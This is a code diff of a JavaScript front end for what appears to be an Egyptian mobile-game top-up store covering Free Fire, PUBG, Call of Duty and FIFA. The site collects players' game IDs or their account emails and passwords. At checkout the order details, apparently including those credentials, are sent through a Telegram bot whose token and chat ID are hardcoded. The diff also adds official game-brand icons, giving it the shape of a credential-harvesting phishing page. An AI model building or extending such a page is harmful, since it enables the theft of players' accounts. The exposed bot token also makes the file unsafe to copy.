@@ -1,10 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
     // --- Config Setup ---
-    // PLACE YOUR SECURE TELEGRAM CREDENTIALS HERE:
     const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
     const TELEGRAM_CHAT_ID = "8851363543"; 
 
-    // Pages
+    // View Pages
     const landingPage = document.getElementById('landing-page');
     const storePage = document.getElementById('store-page');
     const enterBtn = document.getElementById('enter-btn');
@@ -20,7 +19,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnId = document.getElementById('btn-id');
     const btnAcc = document.getElementById('btn-acc');
 
-    // Inputs & Control Elements
+    // Controls Configuration Inputs
     const idGroup = document.getElementById('id-input-group');
     const accGroup = document.getElementById('acc-input-group');
     const idField = document.getElementById('game-id-field');
@@ -31,24 +30,145 @@ document.addEventListener('DOMContentLoaded', () => {
     const checkoutActionContainer = document.getElementById('checkout-action-container');
     const successNotification = document.getElementById('success-notification');
 
-    // App State Management
+    // Interactive State Variables
     let currentGame = ""; 
     let currentMethod = "ID"; 
     let orderData = { user: "", rawId: "", email: "", password: "", product: "", price: "" };
 
-    // Dynamic UI Theme Adjustments
     const themes = {
-        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://placehold.co/50x50/ff6600/white?text=FF" },
-        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://placehold.co/50x50/00a2ff/white?text=PUBG" },
-        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://placehold.co/50x50/e5c158/000000?text=COD" }
+        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://garena-a.akamaihd.net/garena_cms/live/static/images/ff/favicon.ico" },
+        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
+        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/wzm/home/WZM_AppIcon.jpg" },
+        "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://placehold.co/60x60/00ffcc/000000?text=FC" }
     };
 
-    // 1. Navigation Flow
+    // --- Interactive Link Mouse Position Tracker ---
+    function inverseMousePosition(element, event) {
+        const rect = element.getBoundingClientRect();
+        const x = event.clientX - rect.left;
+        const y = event.clientY - rect.top;
+
+        return {
+            x1: -(x - rect.width / 2) / 20,
+            y1: -(y - rect.height / 2) / 20
+        };
+    }
+
+    function handleTabClick(event) {
+        const navNode = document.querySelector('.nav');
+        const targetLi = event.target.parentNode;
+        const width = targetLi.offsetWidth;
+        const { left } = targetLi.getBoundingClientRect();
+        const offsetLeft = left - navNode.getBoundingClientRect().left;
+
+        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
+        targetLi.classList.add('active');
+
+        navNode.style.setProperty('--after-bg-position', offsetLeft);
+        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
+        navNode.style.setProperty('--after-bg-width', width);
+
+        const targetHash = event.target.getAttribute('href');
+        routeTabView(targetHash);
+    }
+
+    const premiumNav = document.querySelector('.nav');
+    const navLinks = premiumNav.querySelectorAll('li a');
+
+    for (let i = 0; i < navLinks.length; i++) {
+        navLinks[i].addEventListener('click', (e) => {
+            e.preventDefault();
+            handleTabClick(e);
+        });
+        navLinks[i].addEventListener("mousemove", (event) => {
+            const tilt = inverseMousePosition(event.target, event);
+            premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
+            premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
+        });
+    }
+
+    function syncInitialNavbarLayout() {
+        if (!storePage.classList.contains('active')) return;
+        const firstLi = premiumNav.querySelector('ul li');
+        const width = firstLi.offsetWidth;
+        const { left } = firstLi.getBoundingClientRect();
+        const offsetLeft = left - premiumNav.getBoundingClientRect().left;
+
+        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
+        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
+        premiumNav.style.setProperty('--after-bg-width', width);
+    }
+
+    window.addEventListener('resize', syncInitialNavbarLayout);
+
     enterBtn.addEventListener('click', () => {
         landingPage.classList.remove('active');
         storePage.classList.add('active');
+        setTimeout(() => {
+            syncInitialNavbarLayout();
+            routeTabView("#home");
+        }, 50);
     });
 
+    function routeTabView(hashTarget) {
+        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
+        
+        if (hashTarget === "#home" || hashTarget === "") {
+            document.getElementById('home-content-section').classList.add('active-view');
+        } else if (hashTarget === "#search") {
+            document.getElementById('search-content-section').classList.add('active-view');
+            document.getElementById('store-search-input').value = "";
+            processLiveSearchFilter("");
+        } else if (hashTarget === "#about") {
+            document.getElementById('about-content-section').classList.add('active-view');
+        } else if (hashTarget === "#support") {
+            document.getElementById('support-content-section').classList.add('active-view');
+        }
+    }
+
+    // --- Live Search Filters Engine ---
+    const searchInput = document.getElementById('store-search-input');
+    const searchResultsViewport = document.getElementById('search-results-viewport');
+
+    searchInput.addEventListener('input', (e) => {
+        processLiveSearchFilter(e.target.value);
+    });
+
+    function processLiveSearchFilter(queryText) {
+        const cleanedQuery = queryText.trim().toLowerCase();
+        searchResultsViewport.innerHTML = "";
+
+        if (cleanedQuery === "") {
+            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem;">Type a game title to filter...</div>`;
+            return;
+        }
+
+        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
+        let matchesCount = 0;
+
+        sourceCards.forEach(card => {
+            const indexName = card.getAttribute('data-game-search-title') || "";
+            if (indexName.includes(cleanedQuery)) {
+                matchesCount++;
+                const clonedCard = card.cloneNode(true);
+                
+                clonedCard.addEventListener('click', () => {
+                    if (indexName.includes("free fire")) configureModalTheme("FREE FIRE");
+                    if (indexName.includes("pubg")) configureModalTheme("PUBG");
+                    if (indexName.includes("call of duty")) configureModalTheme("CALL OF DUTY");
+                    if (indexName.includes("fifa")) configureModalTheme("FIFA MOBILE");
+                });
+
+                searchResultsViewport.appendChild(clonedCard);
+            }
+        });
+
+        if (matchesCount === 0) {
+            searchResultsViewport.innerHTML = `<div class="not-found-feedback">sorry, this game is not found</div>`;
+        }
+    }
+
+    // Secondary Modal Framework Closures
     document.getElementById('close-modal').addEventListener('click', () => gameModal.classList.remove('active'));
     document.getElementById('back-to-id').addEventListener('click', () => {
         rechargeModal.classList.remove('active');
@@ -59,7 +179,7 @@ document.addEventListener('DOMContentLoaded', () => {
         rechargeModal.classList.add('active');
     });
 
-    // --- Product Sets ---
+    // --- Product Price Matrix Data Sets ---
     const ffIdProducts = `
         <div class="recharge-item"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
@@ -70,14 +190,13 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>
     `;
 
-    // Added Account specific products for Free Fire as requested
     const ffAccProducts = `
-        <div class="recharge-item"><span class="item-name">◇ 100 Diamond  Bonus</span><span class="item-price">50 EGP</span></div>
+        <div class="recharge-item"><span class="item-name">◇ 100 Diamond Bonus</span><span class="item-price">50 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">95 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 310 Diamond</span><span class="item-price">140 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 400 Diamond</span><span class="item-price">180 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 500 Diamond</span><span class="item-price">225 EGP</span></div>
-         <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">75 EGP</span></div>
+        <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">75 EGP</span></div>
         <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
     `;
 
@@ -85,7 +204,6 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
-        <div class="recharge-item"><span class="item-name">◇ 310 UC</span><span class="item-price">155 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
         <div class="recharge-item"><span class="item-name">◇ 1800 UC</span><span class="item-price">1055 EGP</span></div>
         <div class="recharge-item membership"><span class="item-name">★ LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
@@ -101,7 +219,13 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="recharge-item membership"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
     `;
 
-    // Apply specific modal UI elements per game Selection
+    const fifaProducts = `
+        <div class="recharge-item"><span class="item-name">◇ 40 FC Points</span><span class="item-price">25 EGP</span></div>
+        <div class="recharge-item"><span class="item-name">◇ 100 FC Points</span><span class="item-price">55 EGP</span></div>
+        <div class="recharge-item"><span class="item-name">◇ 520 FC Points</span><span class="item-price">255 EGP</span></div>
+        <div class="recharge-item"><span class="item-name">◇ 1070 FC Points</span><span class="item-price">505 EGP</span></div>
+    `;
+
     function configureModalTheme(gameKey) {
         currentGame = gameKey;
         const currentTheme = themes[gameKey];
@@ -111,14 +235,18 @@ document.addEventListener('DOMContentLoaded', () => {
         modalIcon.src = currentTheme.icon;
         modalIcon.style.borderColor = currentTheme.color;
         
-        // Only enable Toggle if Free Fire is selected
+        // Dynamic Modal Input Styling Changes Based on active theme
+        gameModal.querySelector('.input-section').style.borderColor = currentTheme.color;
+        gameModal.querySelectorAll('.input-header').forEach(h => h.style.color = currentTheme.color);
+        btnId.style.borderColor = currentTheme.color;
+        btnAcc.style.borderColor = currentTheme.color;
+        
         if (gameKey === "FREE FIRE") {
             toggleContainer.style.display = 'flex';
         } else {
             toggleContainer.style.display = 'none'; 
         }
         
-        // Clear old inputs
         idField.value = "";
         emailField.value = "";
         passField.value = "";
@@ -127,16 +255,22 @@ document.addEventListener('DOMContentLoaded', () => {
         gameModal.classList.add('active');
     }
 
-    // 2. Select Game Cards Bindings
-    document.querySelector('.ff-card').addEventListener('click', () => configureModalTheme("FREE FIRE"));
-    document.querySelector('.pubg-card').addEventListener('click', () => configureModalTheme("PUBG"));
-    document.querySelector('.cod-card').addEventListener('click', () => configureModalTheme("CALL OF DUTY"));
+    // Static click bindings for original grid elements
+    document.querySelector('#home-content-section .ff-card').addEventListener('click', () => configureModalTheme("FREE FIRE"));
+    document.querySelector('#home-content-section .pubg-card').addEventListener('click', () => configureModalTheme("PUBG"));
+    document.querySelector('#home-content-section .cod-card').addEventListener('click', () => configureModalTheme("CALL OF DUTY"));
+    document.querySelector('#home-content-section .fifa-card').addEventListener('click', () => configureModalTheme("FIFA MOBILE"));
 
-    // Method Toggles
     function switchToID() {
         currentMethod = 'ID';
         btnId.classList.add('active');
+        // Apply active theme backgrounds
+        btnId.style.background = themes[currentGame].color;
+        btnId.style.color = "#000";
         btnAcc.classList.remove('active');
+        btnAcc.style.background = "transparent";
+        btnAcc.style.color = themes[currentGame].color;
+        
         idGroup.style.display = 'block';
         accGroup.style.display = 'none';
         validateInputs();
@@ -145,7 +279,12 @@ document.addEventListener('DOMContentLoaded', () => {
     function switchToACC() {
         currentMethod = 'ACC';
         btnId.classList.remove('active');
+        btnId.style.background = "transparent";
+        btnId.style.color = themes[currentGame].color;
         btnAcc.classList.add('active');
+        btnAcc.style.background = themes[currentGame].color;
+        btnAcc.style.color = "#000";
+        
         idGroup.style.display = 'none';
         accGroup.style.display = 'block';
         validateInputs();
@@ -154,7 +293,6 @@ document.addEventListener('DOMContentLoaded', () => {
     btnId.addEventListener('click', switchToID);
     btnAcc.addEventListener('click', switchToACC);
 
-    // 3. Form Validation
     function validateInputs() {
         let isValid = false;
         if (currentMethod === 'ID') {
@@ -164,15 +302,19 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         confirmBtn.disabled = !isValid;
-        if (isValid) confirmBtn.classList.add('active-style');
-        else confirmBtn.classList.remove('active-style');
+        if (isValid) {
+            confirmBtn.classList.add('active-style');
+            confirmBtn.style.background = `linear-gradient(to bottom, ${themes[currentGame].color}, ${themes[currentGame].accent})`;
+        } else {
+            confirmBtn.classList.remove('active-style');
+            confirmBtn.style.background = "#4a2107";
+        }
     }
 
     idField.addEventListener('input', validateInputs);
     emailField.addEventListener('input', validateInputs);
     passField.addEventListener('input', validateInputs);
 
-    // 4. Transition to Packages
     confirmBtn.addEventListener('click', () => {
         if (currentMethod === 'ID') {
             orderData.user = `ID: ${idField.value}`;
@@ -186,13 +328,13 @@ document.addEventListener('DOMContentLoaded', () => {
             orderData.password = passField.value;
         }
 
-        // Load specific products based on game and selection choice
         if (currentGame === "PUBG") {
             rechargeList.innerHTML = pubgProducts;
         } else if (currentGame === "CALL OF DUTY") {
             rechargeList.innerHTML = codProducts;
+        } else if (currentGame === "FIFA MOBILE") {
+            rechargeList.innerHTML = fifaProducts;
         } else {
-            // Free fire configuration
             if (currentMethod === 'ACC') {
                 rechargeList.innerHTML = ffAccProducts;
             } else {
@@ -200,7 +342,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         }
         
-        // Dynamically style internal options inside recharge package
         const activeThemeColor = themes[currentGame].color;
         setTimeout(() => {
             document.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
@@ -236,7 +377,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 `;
                 
                 document.getElementById('order-details').innerHTML = summaryHTML;
-                
                 successNotification.style.display = "none";
                 checkoutActionContainer.innerHTML = `<button id="checkout-btn" class="blue-rect-btn">CHECKOUT</button>`;
                 setupCheckoutSubmission();
@@ -247,7 +387,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // 5. Processing Countdown & Automated Telegram Send
     function setupCheckoutSubmission() {
         const liveCheckoutBtn = document.getElementById('checkout-btn');
         if (!liveCheckoutBtn) return;
@@ -298,8 +437,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 text: botMessage
             })
         })
-        .then(res => console.log("Order sent to Telegram successfully."))
-        .catch(err => console.error("Error sending order to Telegram:", err));
+        .then(res => console.log("Order submitted to Telegram successfully."))
+        .catch(err => console.error("Telegram endpoint issue:", err));
     }
 
     window.addEventListener('click', (e) => {
